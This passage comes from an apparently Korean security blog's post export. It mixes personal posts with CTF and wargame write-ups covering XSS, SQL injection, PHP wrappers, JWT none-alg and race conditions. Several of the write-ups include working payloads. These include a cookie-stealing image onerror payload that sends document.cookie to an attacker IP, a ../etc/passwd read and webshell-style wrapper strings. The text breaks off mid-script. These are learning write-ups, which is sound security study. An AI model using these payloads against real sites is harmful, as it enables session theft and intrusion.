&#x27;https://websec.fr/level24/index.php?p=edit&amp;filename=&#x27;+payload data = &#123;&#x27;filename&#x27;: payload, &#x27;data&#x27;: shell()&#125; req = sess.post(url, data=data)def execute(sess, session_key): url = &#x27;https://websec.fr/level24/uploads/&#x27;+session_key+&#x27;/&#x27;+filename r = sess.get(url) print url print r.textdef main(): sess = requests.Session() session_key = session(sess) exploit(sess) execute(sess, session_key)main() 세션값이 실행 시마다 변경되기 때문에 같은 방법으로 실행 때 마다 새 세션을 구해줘야 하는데, 이 부분에서 세션키를 얻는 과정이 갑자기 생각안나서 한 2시간 잡고있었던 것 같다.. 풀면서 느낀거지만, 파이썬 언어 연습좀 더 해야겠다.","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"BOB 8기 서류 & 면접 후기","slug":"bob8th-200510","date":"2020-05-09T15:00:00.000Z","updated":"2021-01-17T08:47:52.780Z","comments":true,"path":"2020/05/10/bob8th-200510/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/10/bob8th-200510/","excerpt":"","text":"올해도 bob 9기 교육생 모집이 시작되었습니다..!! 이번에도 기회가 주어진 만큼 열심히 준비하고 꼭 붙고 싶은 마음 뿐입니다..! 9기 이전에 저는 8기 때도 bob에 교육생으로 지원하게 되었습니다. 체계적인 교육 과정과 프로젝트 등.. 제가 생각하는 bob는 기대 그 이상으로 좋은 프로그램이라고 생각하고 있습니다. 지금도 그렇구요 먼저 서류에 대해서 약간 후기를 남겨봅니다. 자기소개서 본인이 이룬 성과 및 사례 지원동기 합격후 포부 관심 분야 학업 계휙 진로 계휙 전반적으로 위 7가지 항목에 대해서 내가 어떤 사람이고, 보안에 어떻게 관심을 가졌는지, 지금까지 어떤 활동을 해왔는지 등에 대해서 상세적으로 풀어서 작성하였습니다.. 정확히 어떤 내용을 작성해야 하는지는 이제 본인이 직접 하나씩 트리를 정리해보면서 작성해보시는 것을 권유드립니다. 일단 서류도 보면 경쟁률이 어마어마 하기 때문에 절대! 모든 항목에 대해 소홀히 쓰시면 안되고 어필할 수 있는 것을 모두 짧고 굵게 어필 해야 한다고 생각이 듭니다 ㅎㅎ.. 앗! 또한 서류 작성하실 때 거짓된 내용, 자기가 한것처럼 꾸미는 내용, 아는척(?) 에 대해서 글을 쓰시면 안됩니다. 멘토님들이 서류를 하나하나 모두 검토하시기 때문에 서류는 붙을 수 있어도 면접에서 다 들통나게 됩니다.. (거짓된 내용 쓸려는 생각 자체가 잘못된거죠 사실,,) 서류 지원 기간은 약 한달 정도 있었는데 여차저차 하면서 사실 촉박하게 준비한 것은 맞습니다 그럼에도 불구하고 운 좋게 서류 합격 통보를 받았고 면접까지 갈 수 있는 기회가 생기게 되면서 저는 조금 기뻤지만, 감격도 잠시.. 저는 앞에 말했듯이 너무 촉박하게 준비한 탓에 프로젝트를 뭘 해야할까도 생각해야 했고 여러 무거운 관문앞에 서 있었습니다.. (사실 여기서 내가 지금 준비된게 맞을까? ) 이런 생각도 들었지만 그래도 기회가 주어진 만큼 최선을 다하자고 다짐하면서 제가 하고 싶은 프로젝트를 주제로 준비하였습니다 일단 면접을 볼때 면접대기실 분위기 자체는 괜찮았습니다. (사람 마다 느끼는건 다르지만) 멘토님 3명, 지원자 3명 이렇게 면접장에 들어가 3:3 면접을 보았는데 와.. 면접장에 들어가는 순간부터 정말 무거운 분위기가 저를 반겨주더군요,, 엄청나게 긴장하였습니다.. 그 탓인지 아는 것도 재대로 답을 하지 못했고 말을 얼버무렸습니다.. 감점요소가 제일 큰 부분이 아닐까 싶습니다. 일단 들어가면 PT 발표를 진행하게 되는데 발표 시간은 3분 이였습니다. 즉 임팩트 있게 중요한 내용만 넣어서 발표를 해야한다는 뜻이고 시간을 넘어도 끊지는 않으십니다 시간이 넘었다고 해서 당황할 필요는 없을 것 같습니다. 사실 여기까지만 보면 제가 준비 기간이 넉넉했음에도 재대로 준비를 안했던 것이 비중이 큽니다 그래도 부족한 저를 면접까지 볼 수 있는 기회를 주셨고,, 끝까지 면접 봐주신 멘토님들에게 감사 인사를 드리고 싶습니다. 결과로는 불합격을 하였지만 이번에 9기에도 지원할 수 있는 기회가 생겼으니 이번에는 꼼꼼하게 미리 잘 준비하여 기회를 잡고 싶은 심정이네요,,","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"BoB","slug":"BoB","permalink":"https://blog.jhyeon.dev/tags/BoB/"}]},{"title":"(ko) Docker Language Setting","slug":"dockerset-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:59:45.771Z","comments":true,"path":"2020/04/22/dockerset-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/dockerset-200422/","excerpt":"","text":"1. 설정 변경 사항1sudo apt-get install locales 123456export LANGUAGE=ko_KR.UTF-8export LANG=ko_KR.UTF-8source ~/.bashrclocale-gen ko_KR ko_KR.UTF-8update-locale LANG=ko_KR.UTF-8dpkg-reconfigure locales 근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다. Dockerfile 12345678RUN apt-get install language-pack-ko -yRUN apt-get install fonts-nanum -yRUN apt-get install fonts-nanum-coding -yRUN locale-gen ko_KR.UTF-8ENV LANG ko_KR.UTF-8ENV LANGUAGE ko_KR.UTF-8ENV LC_ALL ko_KR.UTF-8","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"}],"tags":[{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"}]},{"title":"JWT None Type Injection","slug":"jwtinjection-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:59:51.832Z","comments":true,"path":"2020/04/22/jwtinjection-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/jwtinjection-200422/","excerpt":"","text":"1. JWT(JSON WEB TOKEN)JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다. JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다. 2. JWT TOKENJWT는 아래와 같은 형태를 가지고 있고, Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8 헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다. 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다. 123&#123; &quot;name&quot;: &quot;jhyeon&quot;&#125; 세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데, 이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다. 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다. 3. How to JWT None Type Attack?JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다. 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데, 이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, \b잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다. 따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다. 참고 : https://jwt.io","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://blog.jhyeon.dev/tags/JWT/"}]},{"title":"php wrapper","slug":"phpwrapper-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:59:57.921Z","comments":true,"path":"2020/04/22/phpwrapper-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/phpwrapper-200422/","excerpt":"","text":"12345expect:// expect://lsphp:filter php://filter/convert.base64-encode/resource=index.phpzip:// zip://filename.zip#webshell.phpdata:// data://text/plain;base64,&#123;RCE CODE HERE&#125;php://input echo base64_encode(file_get_contents(&quot;filename&quot;));","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"}]},{"title":"Mprotect Exploitation","slug":"pwn-mprotect-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T09:00:13.268Z","comments":true,"path":"2020/04/22/pwn-mprotect-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/pwn-mprotect-200422/","excerpt":"","text":"1. 참고 링크(Notion) Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Mprotect","slug":"Mprotect","permalink":"https://blog.jhyeon.dev/tags/Mprotect/"},{"name":"Shellcode","slug":"Shellcode","permalink":"https://blog.jhyeon.dev/tags/Shellcode/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://blog.jhyeon.dev/tags/Exploitation/"}]},{"title":"xss game Write up","slug":"xssgame-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T09:01:08.490Z","comments":true,"path":"2020/04/22/xssgame-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/xssgame-200422/","excerpt":"","text":"홈페이지 : https://xss-game.appspot.com/ 1. LEVEL-11&lt;svg onload=alert(1)&gt; 2. LEVEL-21&lt;img src=&quot;#&quot; onerror=alert(1)&gt; onerror 이벤트 핸들러로 alert를 띄워줄 수 있다. 3. LEVEL-31234567891011121314151617181920212223242526272829303132333435 &lt;script&gt; function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27; /&gt;&quot;; $(&#x27;#tabContent&#x27;).html(html); window.location.hash = num; // Select the current tab var tabs = document.querySelectorAll(&#x27;.tab&#x27;); for (var i = 0; i &lt; tabs.length; i++) &#123; if (tabs[i].id == &quot;tab&quot; + parseInt(num)) &#123; tabs[i].className = &quot;tab active&quot;; &#125; else &#123; tabs[i].className = &quot;tab&quot;; &#125; &#125; // Tell parent we&#x27;ve changed the tab top.postMessage(self.location.toString(), &quot;*&quot;); &#125; window.onload = function() &#123; chooseTab(unescape(self.location.hash.substr(1)) || &quot;1&quot;); &#125; // Extra code so that we can communicate with the parent page window.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; chooseTab(unescape(self.location.hash.substr(1))); &#125; &#125;, false); &lt;/script&gt;&lt;img src=&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27; /&gt; chooseTab 함수가 호출될 때, 위와 같이 img 태그를 사용하고 있다. 여기서 onerror event handler 사용할려면 #framenum.jpg’ onerror=~ 와 같이 페이로드를 완성해주면 된다. 1frame#4.jpg&#x27; onerror=alert(1)&gt; 4. LEVEL-412345678910 &lt;script&gt; function startTimer(seconds) &#123; seconds = parseInt(seconds) || 3; setTimeout(function() &#123; window.confirm(&quot;Time is up!&quot;); window.history.back(); &#125;, seconds * 1000); &#125; &lt;/script&gt;&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot; /&gt; 타이머 호출 스크립트이다, 그냥 입력한 숫자만큼 타이머가 돌아가는 구조라서 딱히 건드릴 부분은 없다. 하지만, 위 부분을 보면 onload event handler 로 스크립트를 실행하고 있다. 즉, onload 부분을 이용해서 alert를 띄워주면 된다. 1timer=1&#x27;);alert(&#x27;1 5. LEVEL-51234567&lt;body id=&quot;level5&quot;&gt; Welcome! Today we are announcing the much anticipated&lt;br&gt;&lt;br&gt; &lt;img src=&quot;/static/logos/level5.png&quot; /&gt;&lt;br&gt;&lt;br&gt; &lt;a href=&quot;/level5/frame/signup?next=confirm&quot;&gt;Sign up&lt;/a&gt; for an exclusive Beta.&lt;/body&gt; welcome.html 에서 sign up 페이지로 넘어가는 과정을 보면 ?next= 파라미터에 confirm 값을 담아서 a 태그로 페이지를 넘긴다. 여기서 보면 get 방식으로 값이 넘어오기 때문에 next= 에 대한 값을 바꿀 수 있게 된다. 즉, href 속성 값의 next= 파라미터의 값을 통해 alert 팝업을 실행해야 하는데, a 태그에서의 javascript 실행은 다음과 같이 구성된다. javascript:alert(1) 그래서 next=javascript:alert(1) 를 입력해주면 next 버튼을 클릭했을 때 자바스크립트 팝업창이 실행된다. 6. LEVEL-61234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;script&gt;function setInnerText(element, value) &#123; if (element.innerText) &#123; element.innerText = value; &#125; else &#123; element.textContent = value; &#125;&#125;function includeGadget(url) &#123; var scriptEl = document.createElement(&#x27;script&#x27;); // This will totally prevent us from loading evil URLs! if (url.match(/^https?:\\/\\//)) &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Sorry, cannot load a URL containing \\&quot;http\\&quot;.&quot;); return; &#125; // Load this awesome gadget scriptEl.src = url; // Show log messages scriptEl.onload = function() &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Loaded gadget from &quot; + url); &#125; scriptEl.onerror = function() &#123; setInnerText(document.getElementById(&quot;log&quot;), &quot;Couldn&#x27;t load gadget from &quot; + url); &#125; document.head.appendChild(scriptEl);&#125;// Take the value after # and use it as the gadget filename.function getGadgetName() &#123; return window.location.hash.substr(1) || &quot;/static/gadget.js&quot;;&#125;includeGadget(getGadgetName());// Extra code so that we can communicate with the parent pagewindow.addEventListener(&quot;message&quot;, function(event)&#123; if (event.source == parent) &#123; includeGadget(getGadgetName()); &#125;&#125;, false);&lt;/script&gt; 마지막 문제이다, 전체적인 코드가 좀 긴데 보면은 url.match 로 https 값이 있는지 검증해서 필터링한다. 그렇다고 http를 넣어서 하면은 http를 포함할 수 없다고 오류 메세지를 친절하게 반환해준다. 1&lt;script src=&quot;값&quot;&gt;&lt;/script&gt; 위 조건을 통과하고 나면 script를 호출하게 되는데 위와 같이 실행된다. 문제의 의도대로 풀려면 힌트에서 주어지는 google api 를 통해서 보면 되는데, https ://google.com/jsapi?callback=foo 여기서 함수 호출 과정을 보니 callback 파리미터로 넘어온 변수를 실행시켜주고 있다. 그렇기에 callback 파라미터로 alert를 날려주면 alert(); 이 실행될 것 이다. #Https://google.com/jsapi?callback=alert ALL CLEAR","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"}]},{"title":"angstorm ctf 2020 Write up","slug":"angstormctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T08:59:20.413Z","comments":true,"path":"2020/04/10/angstormctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/angstormctf-200410/","excerpt":"","text":"1. [WEB - The Magic Word]12345678910&lt;script&gt; var msg = document.getElementById(&quot;magic&quot;); setInterval(function() &#123; if (magic.innerText == &quot;please give flag&quot;) &#123; fetch(&quot;/flag?msg=&quot; + encodeURIComponent(msg.innerText)) .then(res =&gt; res.text()) .then(txt =&gt; magic.innerText = txt.split``.map(v =&gt; String.fromCharCode(v.charCodeAt(0) ^ 0xf)).join``); &#125;&#125;, 1000);&lt;/script&gt; magic 텍스트의 값을 please give flag 으로 바꿔주면 된다. 2. [WEB - Xmas Still Stands]문제 내 post 기능에서 xss 취약점이 발생한다. 글을 써놓고 report 기능을 통해 게시글 번호를 전송해주면 봇이 내 글에 방문하기 때문에 리다이렉션으로 돌려놓고 포트 열고 대기하면 쿠키값이 날아오는데 날아오는 쿠키값으로 페이지 내 쿠키를 다시 세팅해주고 /admin 으로 접속하면 된다. 1&lt;img src=&quot;#&quot; onerror=this.src=&#x27;https://IP:9999/?cookie=&#x27;+document.cookie/&gt; GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1-&gt; super_secret_admin_cookie=hello_yes_i_am_admin 3. [WEB - Consolation]1&lt;button onclick=&quot;nofret()&quot; style=&quot;height:150px; width:150px;&quot;&gt;pay me some money&lt;/button&gt; 먼저 이 버튼을 누르면 nofret() 라는 함수를 호출 시키는데 이 함수를 따라가면 다음과 같다. 1function nofret()&#123;document[_0x4229(&#x27;0x95&#x27;,&#x27;kY1#&#x27;)](_0x4229(&#x27;0x9&#x27;,&#x27;kY1#&#x27;))[_0x4229(&#x27;0x32&#x27;,&#x27;yblQ&#x27;)]=parseInt(document[_0x4229(&#x27;0x5e&#x27;,&#x27;xtR2&#x27;)](_0x4229(&#x27;0x2d&#x27;,&#x27;uCq1&#x27;))[&#x27;innerHTML&#x27;])+0x19;console[_0x4229(&#x27;0x14&#x27;,&#x27;70CK&#x27;)](_0x4229(&#x27;0x38&#x27;,&#x27;rwU*&#x27;));console[&#x27;clear&#x27;]();&#125; [_0x4229(‘0x95’,’kY1#’)] 이 값을 chrome console 에서 실행시키면 어떤 값인지 알 수 있다. (getelementbyid) 순서대로 콘솔에 실행시켜보면 결과적으로, 0x4229(‘0x38’,’rwU*’) 이 값이 FLAG 를 가지고 있고, 콘솔에서 실행시키면 플래그를 얻을 수 있다. 4. [WEB - Git Good]아무것도 없는 Hello world 출력만 된 페이지이다, 문제의 이름 답게 /.git/ 을 통해 repository 저장소를 다운로드 할 수 있다. git clone https://gitgood.2020.chall.actf.co/.git/ 해당 저장소를 다운받아서 보면, thisistheflag.txt 라는 파일이 있는데 아무것도 없다, 그래서 커밋된 정보를 확인하기 위해 git show 를 해보면, 플래그가 있다. 1234--- a&#x2F;thisistheflag.txt+++ b&#x2F;thisistheflag.txt@@ -1,3 +1 @@-actf&#123;b3_car3ful_wh4t_y0u_s3rve_wi7h&#125; 5. [WEB - Secret Agents]처음엔 고민좀 해보다가 user-agent injection 을 통해서 문제를 풀 수 있었다. user-agent 값에 ‘ or ‘1’ = ‘1# 과 같이 injection 을 하나씩 해주고 사이트에 들어가보면 오류 메세지가 각각 다르게 반환되는 것을 볼 수 있다. 결과적으로 ‘ or ‘1’ = ‘1’ limit 2,1# 를 user-agent 값에 주입 하면 플래그가 있는 페이지를 볼 수 있다.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"zer0pts 2020 Write up","slug":"zer0ptsctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T09:01:16.940Z","comments":true,"path":"2020/04/10/zer0ptsctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zer0ptsctf-200410/","excerpt":"","text":"1. [web] can you guess it?(338 pt)12345678910111213141516171819202122&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt; 1234if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125; 해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다. 12345&lt;?phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125; config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데, 정규식 표현으로 입력값 필터링을 하고 있다. 그런데 php 에서 basename 함수는 문자 \\x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다. index.php/config.php/%80?source 2. [web] music blog(653 pt)123456789101112131415161718192021222324&lt;?php// (snipped)const flag = &#x27;zer0pts&#123;&lt;censored&gt;&#125;&#x27;;// (snipped)const crawl = async (url) =&gt; &#123; console.log(`[+] Query! ($&#123;url&#125;)`); const page = await browser.newPage(); try &#123; await page.setUserAgent(flag); await page.goto(url, &#123; waitUntil: &#x27;networkidle0&#x27;, timeout: 10 * 1000, &#125;); await page.click(&#x27;#like&#x27;); &#125; catch (err)&#123; console.log(err); &#125; await page.close(); console.log(`[+] Done! ($&#123;url&#125;)`)&#125;; 문제에 보면 게시글을 올릴 수 있는 기능이 있다. 그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다. 그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다. 123456789101112131415&lt;section&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1 class=&quot;mt-4&quot;&gt; &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt; &lt;?= $post[&#x27;title&#x27;] ?&gt; &lt;/h1&gt; &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#x27;username&#x27;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;&lt;/span&gt;&lt;/span&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt; &lt;/div&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;a href=&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/section&gt; 게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다. 로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때 리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다. 12345function render_tags($str) &#123; $str = preg_replace(&#x27;/\\[\\[(.+?)\\]\\]/&#x27;, &#x27;&lt;audio controls src=&quot;\\\\1&quot;&gt;&lt;/audio&gt;&#x27;, $str); $str = strip_tags($str, &#x27;&lt;audio&gt;&#x27;); // only allows `&lt;audio&gt;` return $str;&#125; 하지만 입력값 필터링이 걸려 있다. 그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면 audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다. 즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다. 1&lt;a/udio href=&#x27;myip.kr:12345&#x27; id=&#x27;like&#x27;&gt;like","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"zixem challenge Write up","slug":"zixemchall-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T09:01:22.638Z","comments":true,"path":"2020/04/10/zixemchall-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zixemchall-200410/","excerpt":"","text":"Site : https://www.zixem.altervista.org/SQLi/ 1. LEVEL-11id=0%20union%20select%201,version(),3;--%20- 2. LEVEL-21showprofile=0%27%20union%20select%201,2,version(),4;--%20- 3. LEVEL-31item=0%27%20unionon%20select%201,2,version(),4;--%20- 4. LEVEL-41ebookid=0%27%20union%20select%201,2,3,version(),5;--%20- 5. LEVEL-5123456789101112#!/usr/bin/pythonimport requestsfor i in range(0,2000):param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i)r = requests.get(param)print paramif &quot;Brute Force&quot; in r.text: print &quot;found key: &quot; + str(i) break 6. LEVEL-61serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23 7. LEVEL-71id=0%20union%20select%201,version(),3;--%20- 8. LEVEL-81id=0%09union%09seselectlect%091,version(),3;--%09- 9. LEVEL-910%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20- 10. LEVEL-10 php uuencode -&gt; base64 encode x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK ALL CLEAR","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"TRUST CTF 2019 Write up","slug":"trustctf-200223","date":"2020-02-22T15:00:00.000Z","updated":"2021-01-17T09:00:28.050Z","comments":true,"path":"2020/02/23/trustctf-200223/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/23/trustctf-200223/","excerpt":"","text":"1. (web) ezrc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php session_start(); include &#x27;config.php&#x27;; ?&gt;&lt;?php if(!isset($_SESSION[&#x27;id&#x27;]))&#123; header(&#x27;Location: ./login.html&#x27;); exit; &#125;?&gt;&lt;a href=&quot;source.php&quot;&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt;&lt;?php $id = $_SESSION[&#x27;id&#x27;]; $res = mysqli_query($con, &quot;select pw from ezrc where id=&#x27;$id&#x27;&quot;); $idx = mysqli_fetch_array($res); $pw = $idx[&#x27;pw&#x27;]; $print_query = &quot;select chk from ezrc where id=&#x27;$id&#x27;&quot;; $hehe_query = &quot;update ezrc set chk=&#x27;$hehe&#x27; where id=&#x27;$id&#x27;&quot;; $reset_query = &quot;update ezrc set chk=&#x27;nope&#x27; where id=&#x27;$id&#x27;&quot;; echo &quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;; echo &quot;your id is &quot;.$id.&quot;&lt;br/&gt;&quot;; if(preg_match(&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;, $_GET[&#x27;key&#x27;]) &amp;&amp; strlen($_GET[&#x27;key&#x27;])&gt;30)&#123; $res = mysqli_query($con, $print_query); $idx = mysqli_fetch_array($res); echo &quot;your chk is &quot;.$idx[&#x27;chk&#x27;].&quot;&lt;br/&gt;&quot;; if($idx[&#x27;chk&#x27;] == $hehe)&#123; echo $flag.&quot;&lt;br/&gt;&quot;; mysqli_query($con, $reset_query); exit(&quot;congratulations&quot;); &#125; &#125; mysqli_query($con, $hehe_query); $str = &quot;trust_is_very_cooool&quot;; $t = (int)$_GET[&#x27;times&#x27;]; if($pw == md5(240610708))&#123; echo &quot;pw right&quot;; for($i=0; $i&lt;$t; $i=$i+1)&#123; for($j=0; $j&lt;$t; $j=$j+1)&#123; $str = md5($str); &#125; &#125; if($str == &quot;d91a2796ab967c9793ef1c628a91fac5&quot;)&#123; echo $flag; &#125; else&#123; mysqli_query($con, $reset_query); &#125; &#125; else&#123; mysqli_query($con, $reset_query); &#125;?&gt; 레이스 컨디션(race condition) 을 이용하는 문제이다. 서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다. CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 케이스) 암튼 파이썬으로 코딩해서 문제를 풀어주면 된다. 12345678910111213141516171819202122232425262728293031import requestsimport threadingcookie1 = &#123;&#x27;PHPSESSID&#x27;:&#x27;bb11&#x27;&#125;cookie2 = &#123;&#x27;PHPSESSID&#x27;:&#x27;bb22&#x27;&#125;def login(cookie): url = &quot;http://198.13.32.181:4345/login_check.php&quot; param = &#123;&#x27;id&#x27;:&#x27;bb&#x27;,&#x27;pw&#x27;:&#x27;bb&#x27;&#125; r = requests.post(url, data=param, cookies=cookie) print r.textdef times(): global cookie1; url = &quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot; r = requests.get(url, cookies=cookie1)def flag(): global cookie2; url = 